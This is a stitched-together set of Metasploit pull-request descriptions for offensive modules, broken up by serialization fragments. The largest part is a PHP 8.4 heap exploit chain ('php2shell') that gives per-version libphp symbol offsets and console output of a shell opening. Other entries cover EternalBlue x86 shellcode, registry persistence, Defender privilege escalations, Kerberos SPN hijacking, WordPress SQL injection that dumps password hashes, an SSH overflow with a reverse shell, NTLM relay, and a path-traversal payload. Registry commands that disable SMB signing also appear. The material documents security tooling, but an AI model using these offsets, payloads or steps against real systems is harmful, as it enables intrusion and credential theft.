| PHP-FPM, 4 workers, PHP 8.4.26 | `check` Appears; exploit fails at heap-leak stage |
| Apache prefork, 4 workers, PHP 8.4.26 | `check` Appears; exploit fails at heap-leak stage |
| LiteSpeed lsphp 8.4.15 with the lab PHP settings | `check` Appears; exploit fails at heap-leak stage |
| Patched 8.4.27 with `X-Powered-By: PHP/8.4.26` (backport simulation) | `check` Appears; exploit fails at heap-leak stage |

The default calibration targets Apache/mod_php prefork with a single worker
and PHP 8.4.26. Calibrated profiles for PHP 8.4.10 through 8.4.26 are included as advanced
options (see below). Other SAPIs, multi-worker pools and
non-amd64 architectures require separate work and are not supported as-is.
`check` is version-range based, so a patched or vendor-backported build with an
unchanged `X-Powered-By` version can be reported as vulnerable (false positive);
the exploit then fails at the heap-leak stage.

No exact vulnerable LiteSpeed lsphp 8.4.26 image was available: the inspected
official LiteSpeed images shipped lsphp 8.4.15 and 8.4.24, and newer tags are
patched. True vendor-backport builds with unchanged version strings were not
available, so that row uses a header-spoofing simulation. Not tested: PHP-FPM or
LiteSpeed built from source at 8.4.26, Windows, macOS.


### Portability / calibration update (2026-10-23)

We retested the chain across the official PHP 8.4 Apache amd64 images. The heap
layout/grooming constants were stable across the tested range; the only
per-build data that changed was the `libphp.so` symbol offsets. All of the
following produced a working shell session with calibrated offsets:

| PHP | `LIBPHP_ZIF_OFFSET` | `LIBPHP_DTOR_OFFSET` |
|---|---|---|
| 8.4.10 | `0x43b7d0` | `0x62cf70` |
| 8.4.13 | `0x445bf0` | `0x63cbe0` |
| 8.4.15 | `0x445f70` | `0x63d42b` |
| 8.4.16 | `0x446930` | `0x63de2b` |
| 8.4.18 | `0x446ff0` | `0x63eb2b` |
| 8.4.20 | `0x447530` | `0x63f9e0` |
| 8.4.21 | `0x4623b0` | `0x65afe0` |
| 8.4.23 | `0x462d70` | `0x65b9a0` |
| 8.4.24 | `0x464530` | `0x65d1e0` |
| 8.4.25 | `0x464c70` | `0x65dc60` |
| 8.4.26 (bookworm/trixie) | `0x465370` | `0x65eb60` |
| 8.5.11 | `0x5996e0` | `0x7b47a0` |

For 8.4.15/8.4.16/8.4.18, the ELF symbol `zval_ptr_dtor` is at `0x63de20`/`0x63eb20`,
but the leaked destructor pointer points to the actual entry at symbol + `0xb`;
the table lists the effective value. The module exposes these as advanced
options; `php:8.4.27` and `php:8.5.12` remain patched.

PHP 8.4.5 (heap leak fails) and 8.5.0 (detonation fails with `zend_mm_heap
corrupted`) are not supported by the current calibration. Other 8.4.x/8.5.x
versions between the tested points remain unverified.

Still unsupported: PHP-FPM and LiteSpeed (SAPI and request/worker lifecycle),
multi-worker prefork pools (leak and detonation can land on different workers
with different ASLR bases), and arm64 (heap leak fails before the libphp stage).

### Older branches (PHP 8.1–8.3)

The 8.4 heap calibration does not carry over to the older branches:

| Target | Heap leak | libphp leak | Result |
|---|---|---|---|
| PHP 8.3.35 | OK | OK (calibrated) | detonation fails (`zend_mm_heap corrupted`), no session |
| PHP 8.2.34 | failed | — | unsupported |
| PHP 8.1.34 | failed | — | unsupported |

PHP 8.3 gets through both leaks but needs heap-layout calibration
(`HTDATA_OFFSET` / field counts); 8.1/8.2 fail in the heap-leak oracle.
Calibrated symbol offsets alone are not sufficient for these branches.

### HTTPS / TLS support

The complete chain now supports TLS, not just `check`. Tested against the same
Apache mod_php 8.4.26 lab target with `mod_ssl` and a self-signed certificate:

```text
msf6 exploit(multi/http/php2shell) > set SSL true
SSL => true
msf6 exploit(multi/http/php2shell) > set SSLVerifyMode NONE
SSLVerifyMode => NONE
msf6 exploit(multi/http/php2shell) > set RPORT 443
msf6 exploit(multi/http/php2shell) > exploit
[*] 10.0.0.2:443 - chunk base = 0x7ffffc200000
[*] 10.0.0.2:443 - libphp base = 0x7ffffe013000
[*] Command shell session 1 opened (10.0.0.3:4444 -> 10.0.0.2:49938)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`SSLVerifyMode` was added as an option (default `NONE` for exploit use); the TLS
transport uses Rex's SSL-aware read path for the leak and detonation stages.
Plain HTTP was re-tested after the change and still opens a session.

### Distro-built PHP / VPS note

A PHP 8.4.26 build from the official tarball on Debian 12 (Apache mod_php, same
lab `php.ini`, verified `8M/64M/upload_progress=On`) had different symbol
offsets (`zif_system=0x3e65f0`, `zval_ptr_dtor=0x5b4e80`) and failed the
heap-leak stage even with those offsets applied. Official-image heap constants
do not transfer to this distro build; a VPS/distro deployment needs full
per-build heap calibration, not only a version match.

## Testing limitations

Automated end-to-end packet authentication tests currently cover HMAC-SHA1. AuthPriv packet tests cover AES-128-CFB privacy with HMAC-SHA1 authentication. RFC key-derivation vectors additionally cover MD5 and SHA1; SHA-2 packet-vector coverage remains outstanding.
Other advertised authentication algorithms have not all received equivalent automated packet-level coverage.3f:T5e1,Adds a new persistence module that hijacks a TypeLib registry key under
HKCU\Software\Classes\TypeLib using the `script:` moniker to execute a
payload via a Windows Script Component (.sct) file. No administrative
privileges required.

## Verification

- [ ] Start `msfconsole`
- [ ] Get a user-level meterpreter session (not SYSTEM)
- [ ] `use exploit/windows/persistence/typelib`
- [ ] `set SESSION [SESSION]`
- [ ] `run`
- [ ] Reboot the target machine or launch explorer.exe
- [ ] You should get a new meterpreter session

The technique works by shadowing a system-wide TypeLib entry in HKLM
with a user-controlled entry in HKCU. When a process like explorer.exe
calls LoadTypeLib() for the targeted GUID, Windows resolves HKCU first
and evaluates the `script:` moniker, which instantiates the .sct file
and launches the payload. A volatile registry key is used as an
execution lock to prevent repeated launches.

<!-- end of auto-generated comment: release notes by coderabbit.ai -->40:Td04,## Description

Floci versions 1.1.0 through 2.1.x evaluate API Gateway response mapping templates using Apache Velocity without sandboxing. The exposed `$util` object allows Java reflection into `ProcessBuilder`, giving an attacker arbitrary command execution in the Floci JVM process.

This module creates a REST API with a MOCK integration, places a malicious VTL response template containing a `ProcessBuilder` chain, deploys it to a stage, and triggers it via the execute-api endpoint. No authentication is required in the default configuration. An optional IAM bypass is included for hardened deployments (wrong SigV4 credential scope causes action resolution to return null and default to allow).

**Related Issue:** CVE-2026-108598, [GHSA-3p4c-wp7w-mgjx](https://github.com/floci-io/floci/security/advisories/GHSA-3p4c-wp7w-mgjx)

PR #21725 added a Ruby 3.4 backtrace-format shim for `PacketFu::StructFu#typecast` inline in `Msf::Exploit::Remote::Ipv6`, which fixed the rogue IPv6 RA module but only loads for the five modules that mix the IPv6 helper in. The 72 modules that use `Msf::Exploit::Capture` or `Msf::Auxiliary::UDPScanner` without IPv6 (`scanner/discovery/arp_sweep`, the LLMNR/NBNS/mDNS spoofers, `bnat_router`, the UDP/TCP/DHCP DoS family, and more) never load the shim and still raise `NoMethodError: undefined method '[]' for nil` from `StructFu#typecast` on the first packet-field setter. That is #21721.

Move the shim to `lib/msf/core/patches/packetfu_structfu.rb` and `require` it from both `exploit/capture.rb` and `exploit/remote/ipv6.rb` in place of the bare `require 'packetfu'`. Regex and reopened module unchanged, no behavioural difference for the IPv6 path. The spec exercises both the Ruby 3.3- `` `method=' `` and Ruby 3.4+ `'Klass#method='` backtrace shapes directly, so a future reformatting is caught before it re-breaks arp_sweep.

Fixes #21721.

Adds x86 (32-bit) target support to `exploit/windows/smb/ms17_010_eternalblue`.

The module previously declared `Arch => [ARCH_X64]` and explicitly bailed out on
x86 targets (`'This module only supports x64 (64-bit) targets'`), even though the
Windows 7 / Server 2008 (`EternalBlueWin7`) code path already carries the x86
`KI_USER_SHARED_DATA`/fake-struct addresses in its grooming and overflow packets
(inherited from sleepya's unified `eternalblue_exploit7.py`). The only pieces
missing for x86 were the kernel-mode shellcode and allowing an x86 payload.

This PR:

- Sets `Arch => [ARCH_X86, ARCH_X64]`.
- Adds sleepya's x86 ring0->ring3 kernel shellcode, assembled with the `WIN7`
  macro. The assembly source is committed under
  `external/source/exploits/eternalblue/` (with a README documenting the exact
  `nasm` build command and how the module patches/uses the blob) so the embedded
  bytes are reproducible and auditable rather than an opaque blob.
- Selects the kernel shellcode from the architecture detected by the check module
  (`auxiliary/scanner/smb/smb_ms17_010`), falling back to the selected payload's
  architecture when the DCE/RPC probe cannot determine it. Aborts with a clear
  message if the payload architecture does not match the target.
- Keeps the Windows 8+ code path x64-only, with an explicit "not implemented"
  message for Windows 8+ x86 (that path has no public reference and was not
  implemented/tested).
- Warns when `ProcessName` is set on an x86 target (the x86 shellcode always
  targets lsass.exe/spoolsv.exe).

The x64 behavior is unchanged.

**Related Issue:** 

## Breaking Changes

None. x64 targets behave exactly as before. x86 is additive; the previous hard
abort on x86 is replaced with working x86 support (Win7/2008) or a clear message
(Win8+).

## Reviewer Notes

- The grooming/overflow packets in `EternalBlueWin7` were already dual-arch, so the
  change is mostly: pick the right kernel shellcode + allow an x86 payload.
- `make_kernel_user_payload` is now a thin dispatcher over
  `make_kernel_user_payload_x86` / `make_kernel_user_payload_x64` keyed on the
  detected architecture (`@detected_arch`).
- The x86 blob's userland copy-size immediate is patched at a fixed, documented
  offset with `stub_size + payload.length`; see
  `external/source/exploits/eternalblue/README.md`.
- Windows 8+ x86 is intentionally deferred (no clean public reference).

<!-- end of auto-generated comment: release notes by coderabbit.ai -->44:Tbd6,## Module: `auxiliary/scanner/ibmi/tn5250_fingerprint`

Adds a read-only reconnaissance module for IBM i (AS/400) hosts, in the same
spirit as existing TN3270-style signon fingerprint scanners. It connects to
a TN5250(E) service, completes telnet option negotiation (TERMINAL-TYPE,
NEW-ENVIRON, EOR, BINARY per RFC 1205 / RFC 1572 / RFC 4777), and renders
the pre-authentication signon panel to extract:

- System name, subsystem, and device name
- Whether the host supports TN5250E (enhanced negotiation)
- The negotiated device type
- Whether the server offers the IBMRSEED encrypted/auto-signon path (RFC 4777)

**This module never attempts authentication, exercises the auto-signon path,
or sends credentials.** It is read-only.

### Verification Steps

1. `use auxiliary/scanner/ibmi/tn5250_fingerprint`
2. `set RHOSTS [IP or hostname]`
3. `run`

### Console output (against a live IBM i 7.5 host)

```

RHOSTS => 192.0.2.10
msf auxiliary(scanner/ibmi/tn5250_fingerprint) > run

[+] 192.0.2.10:23      - System name:  DEMOSYS
[+] 192.0.2.10:23      - Subsystem:    QINTER
[+] 192.0.2.10:23      - Device:       QPADEV003Q
[*] 192.0.2.10:23      - TN5250E:     supported
[+] 192.0.2.10:23      - Encrypted/auto-signon offered (IBMRSEED)
[!] 192.0.2.10:23      - Cleartext TN5250 on 23
[*] 192.0.2.10:23         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Tests

  → no offenses.

  → clean.
- `ruby tools/dev/msftidy_docs.rb documentation/modules/auxiliary/scanner/ibmi/tn5250_fingerprint.md`
  → clean.
- Verified live via `msfconsole` against a real IBM i 7.5 host.

### Known limitations (documented in the module doc)

- Only TN5250E (enhanced) negotiation is handled; a host offering plain
  TN5250 without EOR/BINARY support will time out rather than being
  fingerprinted.
- The screen renderer handles the SBA, RA, IC, and SF orders used by the
  signon panel; other 5250 orders are treated as literal data.
- TLS (port 992) is untested.

<!-- end of auto-generated comment: release notes by coderabbit.ai -->45:T5ef,CVE-2026-33825 ("BlueHammer") is a local privilege escalation in Microsoft Defender's
Antimalware Platform (MpSvc). The exploit abuses the Windows Defender definition
update RPC flow in combination with object manager symbolic links and NTFS
transactions to coerce the SYSTEM-level `MpSvc` into reading and writing
attacker-controlled files out of the volume Shadow Copy. That primitive is used to
leak the local SAM hive, which yields the NTLM hashes of every local account. The
exploit then rotates a local administrator's password (even one with no password
set, by using the well-known NT hash of the empty string as the "current" hash),
logs on, and spawns the operator's payload as `NT AUTHORITY\SYSTEM` in the
session matching the exploit process via a transient service.

<!-- end of auto-generated comment: release notes by coderabbit.ai -->46:T4c2,CVE-2026-41091 ("RedSun") is a local privilege escalation in Microsoft Defender's

activated to execute the planted binary as `NT AUTHORITY\SYSTEM`.

<!-- end of auto-generated comment: release notes by coderabbit.ai -->47:T12d8,## Description

This PR adds `auxiliary/admin/ldap/kerberloss` to audit for and exercise the KerberLoss vulnerability (CVE-2026-25177) in Active Directory.

In pre-March 2026 domain controllers, Active Directory stores comparison-ignorable Unicode characters (such as `U+200C` ZERO WIDTH NON-JOINER) verbatim in `servicePrincipalName`, but strips or ignores them during LDAP SPN comparison and Kerberos target lookup. When an operator possesses unrestricted `WriteProperty` (or equivalent ACL) over a target account's `servicePrincipalName`, they can register a visually identical SPN (e.g., `cifs/DC1.example.test<U+200C>`). A client requesting a service ticket for the clean `cifs/DC1.example.test` name can then have the request resolved to the modified account, resulting in a TGS encrypted under the target's long-term key. If the injected SPN collides with an explicitly registered SPN, KDC returns `KDC_ERR_S_PRINCIPAL_UNKNOWN`, triggering Kerberos DoS or NTLM fallback.

The module provides four actions:
- `AUDIT` (default): read-only query of explicit target SPNs and owners of the requested clean SPN.
- `CHECK`: injects a temporary non-service probe (`msf/<random>.invalid`), tests if the clean probe resolves back to the target, and removes it in an `ensure` block.
- `HIJACK`: adds the specified poisoned SPN, classifies the outcome (`:hijack`, `:collision`, or `:ineffective`), and automatically rolls back ineffective writes. Refuses to touch accounts that already hold that exact poisoned value.
- `CLEANUP`: removes the exact poisoned SPN.

Note: `Validated-Write-SPN` (e.g. machine account self-write) is insufficient because AD enforces hostname validation, resulting in `constraintViolation`. The module distinguishes this error from a patched DC.

## Breaking Changes

None

## Reviewer Notes

- Module is at `modules/auxiliary/admin/ldap/kerberloss.rb`.
- RSpec coverage for normalization, validation, and rollback logic is in `spec/modules/auxiliary/admin/ldap/kerberloss_spec.rb`.
- Helper `visible_value` prints invisible characters as `<U+XXXX>` in console output to prevent terminal ambiguity.
- Tested against an isolated Windows Server 2019 DC.

## Verification Steps

1. Start `msfconsole`.
2. `use auxiliary/admin/ldap/kerberloss`
3. Configure `RHOSTS`, `LDAPDomain`, `LDAPUsername`, `LDAPPassword`, `TARGET_ACCOUNT`, and `SPN` (e.g. `cifs/DC1.lab.test`).
4. Run default `AUDIT` action to verify baseline state.
5. Set `ACTION CHECK` and run to verify comparison behavior without affecting service SPNs.
6. Set `ACTION HIJACK` and run. Verify output indicates clean SPN resolved to target in LDAP.
7. (Optional) Request TGS for clean SPN and decrypt with target key to confirm ticket hijacking.
8. Set `ACTION CLEANUP` and run.
9. Re-run `AUDIT` to confirm target is returned to initial baseline.

48:T1900,## Description

This PR adds an auxiliary module for [CVE-2026-12512](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-12512),
an unauthenticated SQL injection in the WordPress plugin Quotes Llama before 3.1.6
(see the [WPScan advisory](https://wpscan.com/vulnerability/39d038f6-f009-4274-a8a7-9d7c2597ec85/)).

The `sc` POST parameter of the `select_search` AJAX action is passed to
`$wpdb->prepare()` through a `%1s` placeholder. WordPress only quotes bare `%s`
placeholders, so numbered or formatted ones are interpolated unquoted and the
attacker controlled column name reaches the WHERE clause as raw SQL. The handler
is reachable anonymously via `wp_ajax_nopriv_select_search` and its only gate is
a nonce that the plugin's `mode="page"` template prints publicly on every author
link, outside the logged-in check. No configuration change is needed. With the
plugin's default settings the search form is not even rendered for anonymous
visitors, yet the nonce still leaks.

The vulnerability is unauthenticated, needs no user interaction, and yields a
direct dump of usernames and password hashes from the WordPress users table. The module uses
`Msf::Exploit::SQLi` with `MySQLi::Common` and the WordPress SQLi mixin, so it
supports arbitrary queries in addition to the credential dump.
`hex_encode_strings` is required because the injected value is still passed
through `_real_escape()`, so payloads must not contain single quotes.

Fixed upstream in 3.1.6 by switching the placeholder to `%i`.

**Related Issue:** None

## Breaking Changes

None

## Reviewer Notes

The injection sits in a column name position rather than a value position, so the
mixin's query is wrapped as a subquery in the first column of a nine column UNION
that matches the original SELECT.

Write operations are not reachable through this injection point. WordPress uses
`mysqli_query()`, so stacked queries are rejected, and an INSERT inside a UNION is
invalid SQL. The mixin's `wordpress_sqli_create_user` and
`wordpress_sqli_grant_admin_privileges` helpers therefore do not apply here, which
is why this is an auxiliary module and not an exploit.

## Verification Steps

1. Install WordPress and the vulnerable plugin version 3.1.5, as described in the
   module documentation
2. Activate Quotes Llama and leave every plugin option at its default
3. Add a quote with an author name, then publish a page whose content is
   `[quotes-llama mode="page"]`
4. Start `msfconsole` and run `use auxiliary/gather/wp_quotes_llama_sqli`
5. `set RHOSTS [ip]` and `set RPORT [port]`, then `run`
6. Expected: the module reports plugin version 3.1.5, recovers the public nonce
   from the REST API, reports the target as vulnerable, detects the `wp_` table
   prefix and prints a table of usernames with their password hashes, saving the
   result as loot
7. Upgrade the plugin to 3.1.6 and run `check`
8. Expected: the module reports version 3.1.6 and "The target is not
   exploitable", without attempting the injection

<!-- end of auto-generated comment: release notes by coderabbit.ai -->49:T954,## Summary

Adds an exploit module for CVE-2001-0144 — the integer overflow in the SSH protocol 1 CRC32 compensation attack detector (`detect_attack()` in `deattack.c`). A 16-bit hash-table counter wraps on a large packet, yielding an attacker-controlled out-of-bounds write that is brute-forced into remote code execution as root.

Faithful port of the team-teso / dvorak `sshd-exploit`: it brute-forces the hash-table-to-buffer distance, buffer address, stack distance and return address, overwriting the stored return address of `detect_attack` so its `ret` jumps into a NOP sled + payload carried in the executable packet buffer.

Affected:
- `ssh-1.2.x` (ssh.com), ~1.2.25 - 1.2.31
- OpenSSH prior to 2.3.0 with SSH protocol 1 enabled
- several commercial SSH-1 servers

## Module

- `modules/exploits/linux/ssh/ssh_crc32_overflow.rb`
- `documentation/modules/exploits/linux/ssh/ssh_crc32_overflow.md`

`check` is verify-only: completes the SSH-1 handshake and sends a single oversized packet (vulnerable server crashes the handler, patched one rejects it) — no payload, no brute-force.

## Lab

A self-contained 32-bit, mitigation-free SSH-1 target (OpenSSH 2.2.0p1 / OpenSSL 0.9.8zh, no PIE/RELRO/stack-protector, exec stack) is attached alongside the docs under `ssh_crc32_overflow/` (`Dockerfile.i386`, `entrypoint32.sh`, `sshd_config`, `test_client.rb`, `README.md`). Target 0 offsets are matched to this lab. Full build/run and verification steps are in the module documentation.

## Verification

- [x] `check` reports `Vulnerable` against the lab target
- [x] `run` with `linux/x86/shell_reverse_tcp` brute-forces offsets and returns a root session
- [x] `rubocop` and `msftidy` clean on changed files

<!-- end of auto-generated comment: release notes by coderabbit.ai -->4c:T3a35,## Description
This PR needs to be landed first: https://github.com/rapid7/metasploit-framework/pull/21960 then I'll rebase this 

This adds support for the new ADCS relay technique which relays NTLM authentication to the Certificate Enrollment Service (CES).  Sounds familiar? It's just like ESC8 except instead of relaying to the Web Enrollment endpoint auth is relayed to CES to obtain the cert. CES and Web Enrollment although both produce certificates have enough differences that it makes sense to have a separate module for each technique listed below

Currently the module is named `esc8_ces` which might need to be changed to just `esc_ces` (it's not esc8, it's its own thing). I'm indifferent.

https://adhdmurky.github.io/posts/post4/

## Breaking Changes

None

## Reviewer Notes

Testing can be done in skyfrost

## Verification Steps

1. Start `msfconsole` with sufficient local privileges to bind the selected SMB or HTTP listener port.
1. Run `use auxiliary/server/relay/esc8_ces`.
1. Set `RHOSTS`, `TARGETURI`, `VHOST`, and `CES_TO` for the published CES URI.
1. Select `RELAY_SOURCE SMB` for SMB coercion, or `RELAY_SOURCE HTTP` and an HTTP `SRVPORT` for an HTTP authentication source.
1. Run the module and coerce an eligible domain principal to authenticate to the relay server.
1. Verify that a PKCS#12 certificate is stored as loot.

### Windows Server 2019 CES, NTLMv1 HTTP to HTTPS relay

### Windows Server 2019 CES, NTLMv2 SMB to HTTPS relay

## AI Usage Disclosure

codex 

## Web Enrollment vs CES 
- **Separate AD CS services:** Web Enrollment provides browser pages; CES provides automated certificate enrollment. Either service can be deployed independently. [[Microsoft comparison](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-authority-web-enrollment)](<https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-authority-web-enrollment>).
- **Different endpoints:** Web Enrollment uses `/certsrv/` and ASP pages; CES uses a CA-specific `/service.svc/CES` endpoint.
- **Different request formats:** Web Enrollment submits form fields to `certfnsh.asp`; CES sends SOAP XML with WS-Trust/WSTEP and WS-Addressing headers. [[WSTEP specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wstep/ac55b8cc-9ade-4982-b135-991d574ade74)](<https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wstep/ac55b8cc-9ade-4982-b135-991d574ade74>).
- **Different response handling:** Web Enrollment parses HTML and downloads the issued certificate separately; CES extracts certificate material or SOAP faults from XML.
- **Different options and capabilities:** CES needs settings such as `CES_AUTH_SCHEME` and `CES_TO`. The existing Web Enrollment module supports template discovery through `ALL` and `QUERY_ONLY`; the current CES module supports `AUTO` and `SPECIFIC_TEMPLATE`.
- **Clearer module scope:** Separate modules keep configuration, checks, errors, documentation, and tests specific to each service, while preserving existing `esc8` behavior.
- **Shared infrastructure still applies:** Both modules can reuse NTLM relay, CSR generation, and certificate storage helpers; only the enrollment protocol needs separate implementation.
4d:Td4a,## Description

The certutil fetch command path aborted an HTTPS fetch with the message
`FETCH_CHECK_CERT must be true when using CERTUTIL`. That option is only
registered by the HTTPS fetch *server* adapter and unlike the GET path,
which does read it  is never read by the certutil path, so the guidance had
no effect. certutil has no insecure mode and will not fetch from an HTTPS
server whose certificate is not already trusted by the target.

This replaces it with an accurate `BadConfig` failure that points the operator
at a working path the HTTP fetch payload, or `FETCH_COMMAND=CURL` (which does
fetch over HTTPS) and drops the now-redundant `print_error`. Adds regression
coverage asserting the new message and that `FETCH_CHECK_CERT` is no longer
referenced on this path.

**Related Issue:** Fixes #20453

## Breaking Changes

None. The certutil + HTTPS combination already failed with `BadConfig`; only
the error message changed (and a redundant `print_error` was removed).

## Reviewer Notes

The fix is scoped to `_generate_certutil_command` only. The GET path
(`FETCH_CHECK_CERT must be true when using GET`) is intentionally left
untouched because it legitimately reads `datastore['FETCH_CHECK_CERT']` before
failing, so its message is actionable.

## Verification Steps

1. - [x] Run the spec suite for the fetch adapter:
     `bundle exec rspec spec/lib/msf/core/payload/adapter/fetch_spec.rb`
     — expect `21 examples, 0 failures` (includes 2 new regression examples
     under `#_generate_certutil_command`).
2. - [x] Confirm the new examples assert the message matches
     `/CERTUTIL has no insecure mode/` and does **not** include
     `FETCH_CHECK_CERT`.

## Test Evidence

```
$ bundle exec rspec spec/lib/msf/core/payload/adapter/fetch_spec.rb
Finished in 0.21 seconds (files took 2.66 seconds to load)
21 examples, 0 failures

$ bundle exec rubocop lib/msf/core/payload/adapter/fetch.rb spec/lib/msf/core/payload/adapter/fetch_spec.rb

This PR adds comprehensive documentation for 10 high-priority undocumented auxiliary scanner modules, selected based on CVE references, security impact, and protocol importance.

## Motivation

Metasploit Framework currently has **714 undocumented auxiliary scanner modules** (46% documentation coverage). This PR addresses the most critical gap by documenting scanners with:
- Known CVE references (vulnerability scanners)
- Recent modifications (actively maintained)
- High-value protocols (HTTP, SMB, PostgreSQL, NTP, UPnP)
- Practical penetration testing utility

## Documented Modules

1. **scanner/smb/smb_uninit_cred** - Samba uninitialized credential state (CVE-2015-0240)
2. **scanner/http/rails_json_yaml_scanner** - Rails YAML deserialization (CVE-2013-0333)
3. **scanner/http/smt_ipmi_cgi_scanner** - Supermicro IPMI CGI vulnerabilities (CVE-2013-3621, CVE-2013-3623)
4. **scanner/postgres/postgres_dbname_flag_injection** - PostgreSQL flag injection (CVE-2013-1899)
5. **scanner/http/wildfly_traversal** - WildFly directory traversal (CVE-2014-7816)
6. **scanner/http/smt_ipmi_static_cert_scanner** - Supermicro IPMI static certificate (CVE-2013-3619)

8. **scanner/http/joomla_ecommercewd_sqli_scanner** - Joomla ECommerce SQLi (CVE-2015-2562)
9. **scanner/http/gitlab_version** - GitLab version detection scanner

<!-- end of auto-generated comment: release notes by coderabbit.ai -->4f:Tdaf,This PR adds Framework-side support for Meterpreter microextensions: small resident Windows COFF objects that can provide focused Meterpreter commands and channel types without loading an entire extension.

The new `micro` console command supports:

- Loading a single COFF object or a `meterpreter-micro/v1` YAML manifest
- Checking, listing, and unloading resident objects
- Validating object architecture and advertised capabilities
- Exposing selected existing client adapters and commands
- Defining simple packet-based console commands in YAML
- Registering command aliases and trusted Ruby client helpers
- Synchronizing commands, channels, dispatchers, and aliases after unload
- Rolling back objects when a multi-object load fails

The session compatibility logic now accepts micro-only sessions without requiring `stdapi`. The `enum_drives` post module has consequently been reduced to its required Railgun command and its drive-size decoding has been corrected.

**Related PR:** `<companion metasploit-payloads PR>`

## Breaking Changes

None. Existing Meterpreter extension workflows are unchanged. The `micro` command is only displayed when the Meterpreter supports the required core commands.

## Reviewer Notes

The protocol-facing API is in `client_core.rb`; the lifecycle and manifest integration are in the core console dispatcher. Manifest-provided Ruby helpers are intentionally treated as trusted local code.

A compatible Windows Meterpreter containing the payload-side microextension implementation is required for functional verification.

## Verification Steps

1. - [ ] Open an x86 or x64 Windows Meterpreter session built with the companion payload changes.
2. - [ ] Run `micro list` and verify that no objects are initially reported.
3. - [ ] Run `micro load <name> <object.o>` and verify that the assigned handle, commands, and channels are displayed.
4. - [ ] Run `micro has <command-id>` and verify that the loaded command is reported as present.
5. - [ ] Run `micro unload <name-or-handle>` and verify that the object and its associated commands disappear.
6. - [ ] Load a `meterpreter-micro/v1` manifest and verify its `micro run` commands, aliases, client adapter, and/or Ruby helper.
7. - [ ] Attempt to load an object for the wrong architecture and verify it is rejected without leaving a resident object.
8. - [ ] Run `post/windows/gather/forensics/enum_drives` with the compatible Railgun micro profile and verify that it reports physical and logical drives without requiring full `stdapi`.
9. - [ ] Run:
   `bundle exec rspec spec/lib/rex/post/meterpreter/client_core_spec.rb spec/lib/rex/post/meterpreter/micro_helper_spec.rb`

<!-- end of auto-generated comment: release notes by coderabbit.ai -->50:T119a,## Description

Adds an auxiliary module for CVE-2026-103648, a path traversal vulnerability
(CWE-22, CVSS 9.1 Critical) in the `image-downloader` npm package (< 4.3.1).

Root cause: the library's filename-extraction logic calls `path.basename()`
on the still percent-encoded URL pathname before `decodeURIComponent()` runs
on it. A sequence such as `%2e%2e%2f` contains no literal `/` at extraction
time, so it survives `basename()` unchanged; decoding is only applied
afterward, turning it into a literal `../`, which `path.join()` then
normalizes to a path outside the configured destination directory.

The module starts a local HTTP listener and sends the target a URL, built
with a percent-encoded traversal sequence, that points back at that
listener. If vulnerable, the target fetches the listener's payload and
writes it outside its configured download directory. The module confirms
exploitation by observing the outbound fetch; since it has no remote
filesystem access to the target, full confirmation that the write landed
outside `dest` requires local access (demonstrated below against the
Docker lab in the linked PoC repository).

- CVE record: https://www.cve.org/CVERecord?id=CVE-2026-103648
- PoC repo / Docker lab / patch analysis: https://github.com/EterNullSec/CVE-2026-103648
- Upstream fix: https://gitlab.com/demsking/image-downloader/-/commit/fb4454304276e2439fb19b98836b3ba903b3aaea

## Verification

Tested end-to-end against the vulnerable lab server (`vulnerable-app/server.js`
in the linked repo, running the real `image-downloader@4.3.0` dependency)
running on `localhost:3000`.

SRVPORT => 8899

[*] Triggering /download with traversal payload: /%2e%2e%2f%2e%2e%2ftmp%2fpwned_by_msf.txt

<!-- end of auto-generated comment: release notes by coderabbit.ai -->52:T75f,## Description

`msfdb init` can provision users before PostgreSQL is ready. If startup times out, a later `init` can mistake the unfinished database for a completed installation and skip provisioning.

Wait for PostgreSQL readiness using `pg_ctl -w -t 60`, apply authentication rules before startup, and track initialization through migration completion. Retry interrupted setup using saved settings without deleting existing data; leave incomplete `initdb` output and directories without initialization markers for inspection.

Production migrations fail without a Rails key or permission to write their schema dump into the installation. Give the migration subprocess a temporary key when `SECRET_KEY_BASE` is unset and discard its schema dump. Preserve #18442's Windows fix by leaving startup output uncaptured.

## Verification

1. Run `SPEC_HELPER_LOAD_METASPLOIT=false bundle exec rspec spec/lib/msfdb_helpers/pg_ctl_spec.rb`; expect 21 examples and no failures.
2. In a disposable profile, run `msfdb init --component database --use-defaults`, then `msfconsole -qx 'db_status; exit'`; expect successful initialization and a connection.
3. Repeat `msfdb init`; it should recognize the completed database without provisioning again.

## Test evidence

The 21 helper specs pass on macOS and Windows. Recovery, fresh and repeated initialization also pass against installed runtimes, with 164 migrations verified by SQL and the installed schema unchanged.

[All ten package jobs passed](https://github.com/pauljccode/metasploit-omnibus/actions/runs/41274625596) with Ruby 3.4.12 on macOS 14 arm64, macOS 15 x86_64, Windows Server 2022 and Linux. They build `809e1587` plus migration correction `711d40bb` and verify its source digests. ARMv7 covers build and package health only.

53:T36bb,## Description

The http_to_smb relay module didn't support relaying NTLMv2 auth. When signing and sealing is not required, NTLMv2 auth is able to be relayed. The module was originally tested against NTLMv1 auth as it seems there was a misconception stemming from the http_to_ldap module (apologies) regarding the ability to relay NTLMv2 auth. 

## Breaking Changes

None

## Verification Steps

1. Configure the domain env to use NTLMv1
  a. `reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa -v LmCompatibilityLevel /t REG_DWORD /d 0x2 /f`
1. Ensure http_to_smb is working correctly
1. Ensure http_to_ldap is working correctly
1. Configure the domain env to use NTLMv2
   a. `reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa -v LmCompatibilityLevel /t REG_DWORD /d 0x5 /f`
1. Ensure http_to_smb is working correctly
1. Ensure http_to_ldap is working correctly

Run the following to set signing and sealing to optional:
```
New-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' `
  -Name RequireSecuritySignature -PropertyType DWord -Value 0 -Force
New-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' `
  -Name LDAPServerIntegrity -PropertyType DWord -Value 1 -Force
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
```

### NTLMv2 why Invoke-WebRequest doesn't work when relaying to LDAP but does with curl
